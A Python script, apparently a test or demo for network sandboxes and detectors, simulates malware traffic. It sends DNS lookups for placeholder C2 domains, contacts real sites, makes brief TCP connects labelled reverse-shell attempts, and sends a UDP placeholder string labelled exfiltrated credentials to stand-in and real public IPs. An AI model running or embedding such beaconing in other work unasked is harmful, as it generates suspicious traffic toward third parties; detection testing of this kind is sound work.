#!/usr/bin/env python3
import socket
import urllib.request
import time
import sys

print("======================================================================")
print("             SIMULATED MALWARE NETWORK BEHAVIOR DEMO                  ")
print("======================================================================")
print("This script simulates typical steps malware performs when requesting C2")
print("servers, downloading payloads, exfiltrating data, and checking connectivity.")
print("It uses fast UDP/TCP sockets with short timeouts so it never hangs, even")
print("when running inside a strictly offline/isolated network sandbox.")
print("======================================================================")
sys.stdout.flush()

# Helper to send a DNS query over UDP with a fast 0.5s timeout
def send_simulated_dns_query(domain, dns_server="1.1.1.1"):
    try:
        # Construct DNS query payload manually to avoid OS blocking getaddrinfo delays
        parts = domain.split(".")
        qname = b""
        for part in parts:
            if not part:
                continue
            qname += bytes([len(part)]) + part.encode('utf-8')
        qname += b"\x00"
        
        # Header (12B) + QNAME + QTYPE (A = 1) + QCLASS (IN = 1)
        packet = (
            b"\x12\x34" +  # Transaction ID
            b"\x01\x00" +  # Flags: Standard query
            b"\x00\x01" +  # QDCOUNT: 1 question
            b"\x00\x00" +  # ANCOUNT: 0 answers
            b"\x00\x00" +  # NSCOUNT: 0 authority RRs
            b"\x00\x00" +  # ARCOUNT: 0 additional RRs
            qname +
            b"\x00\x01" +  # QTYPE: A (IPv4)
            b"\x00\x01"    # QCLASS: IN
        )
        
        # Send query
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        sock.sendto(packet, (dns_server, 53))
        
        # Try to read response (will time out quickly if offline)
        try:
            sock.recvfrom(512)
        except socket.timeout:
            pass
        sock.close()
    except Exception:
        pass

def send_simulated_dns_query_v6(domain, dns_server="2606:4700:4700::1111"):
    try:
        parts = domain.split(".")
        qname = b""
        for part in parts:
            if not part:
                continue
            qname += bytes([len(part)]) + part.encode('utf-8')
        qname += b"\x00"
        
        # Header (12B) + QNAME + QTYPE (AAAA = 28) + QCLASS (IN = 1)
        packet = (
            b"\x12\x34" +  # Transaction ID
            b"\x01\x00" +  # Flags: Standard query
            b"\x00\x01" +  # QDCOUNT: 1 question
            b"\x00\x00" +  # ANCOUNT: 0 answers
            b"\x00\x00" +  # NSCOUNT: 0 authority RRs
            b"\x00\x00" +  # ARCOUNT: 0 additional RRs
            qname +
            b"\x00\x1c" +  # QTYPE: AAAA (IPv6)
            b"\x00\x01"    # QCLASS: IN
        )
        
        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        sock.settimeout(0.5)
        sock.sendto(packet, (dns_server, 53))
        
        try:
            sock.recvfrom(512)
        except socket.timeout:
            pass
        sock.close()
    except Exception:
        pass

# Set global default socket timeout for HTTP/TCP requests
socket.setdefaulttimeout(1.0)

# 1. DNS Resolution attempts (simulates host lookups for infrastructure)
print("\n[Phase 1] Simulating DNS lookups for Command & Control servers (IPv4 & IPv6)...")
domains = [
    ("c2-server.malicious-domain.xyz", "v4"),
    ("payload-downloader.infra-server.net", "v4"),
    ("data-exfiltration-db.org", "v4"),
    ("api.telegram.org", "v4"),
    ("pastebin.com", "v4"),
    ("github.com", "v4"),
    ("neverssl.com", "v4"),
    ("ipv6.google.com", "v6"),
    ("v6-c2.malicious-domain.xyz", "v6")
]
for domain, mode in domains:
    print(f"  --> Simulating {mode.upper()} lookup: {domain}")
    sys.stdout.flush()
    if mode == "v4":
        send_simulated_dns_query(domain)
    else:
        send_simulated_dns_query_v6(domain)
    time.sleep(0.5)

# 2. HTTP Request (simulates check for plain text updates or initial connectivity)
print("\n[Phase 2] Simulating HTTP request (Initial connectivity check)...")
print("  --> Requesting: http://neverssl.com")
sys.stdout.flush()
try:
    urllib.request.urlopen("http://neverssl.com", timeout=1.0)
except Exception:
    pass
time.sleep(0.5)

# 3. HTTPS / TLS Requests (simulates secure C2 communication)
print("\n[Phase 3] Simulating HTTPS C2 communication...")
urls = [
    "https://github.com",
    "https://api.telegram.org",
    "https://pastebin.com"
]
for url in urls:
    print(f"  --> Contacting secure server: {url}")
    sys.stdout.flush()
    try:
        urllib.request.urlopen(url, timeout=1.0)
    except Exception:
        pass
    time.sleep(0.5)

# 4. Raw TCP Connection attempts (simulates Reverse Shell attempts)
print("\n[Phase 4] Simulating TCP Reverse Shell attempts to remote IPs on custom ports (IPv4 & IPv6)...")
targets = [
    ("198.51.100.42", 4444),
    ("203.0.113.88", 1337),
    ("2001:db8::42", 4444)
]
for ip, port in targets:
    print(f"  --> Attempting raw TCP connection to [{ip}]:{port}...")
    sys.stdout.flush()
    try:
        family = socket.AF_INET6 if ":" in ip else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((ip, port))
        s.close()
    except Exception:
        pass
    time.sleep(0.5)

# 5. UDP Raw packets (simulates UDP heartbeat beacons)
print("\n[Phase 5] Simulating UDP heartbeat beacon exfiltration (IPv4 & IPv6)...")
udp_targets = [
    ("198.51.100.42", 53),
    ("8.8.8.8", 9999),
    ("2001:db8::42", 53),
    ("2606:4700:4700::1111", 9999)
]
for ip, port in udp_targets:
    print(f"  --> Sending UDP exfiltration bytes to [{ip}]:{port}...")
    sys.stdout.flush()
    try:
        family = socket.AF_INET6 if ":" in ip else socket.AF_INET
        s = socket.socket(family, socket.SOCK_DGRAM)
        s.sendto(b"\x00\x01SimulatedExfiltratedSystemCredentialsDataHere\x00", (ip, port))
        s.close()
    except Exception:
        pass
    time.sleep(0.5)

print("\n======================================================================")
print("[+] Simulated malware behavior demo script finished.")
print("======================================================================")
sys.stdout.flush()
